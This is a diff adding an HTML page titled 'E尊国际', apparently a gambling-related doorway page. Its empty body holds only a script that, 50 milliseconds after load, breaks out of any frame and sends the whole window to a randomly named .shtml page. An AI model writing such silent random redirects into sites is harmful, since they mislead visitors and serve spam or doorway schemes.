@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <base target="_parent">
+
+
+    <meta http-equiv=Content-Type content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
+    
+<title>E尊国际</title>
+<script>
+setTimeout(function(){
+	top.location.href=randomString(8) + ".shtml";
+},50);
+function randomString(len) {
+	len = len || 32;
+	var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
+	var maxPos = $chars.length;
+	var pwd = '';
+	for (i = 0; i < len; i++) {
+		pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+	}
+	return pwd;
+}
+</script>
+
+</head>
+
+<body>
+</body>
+</html>
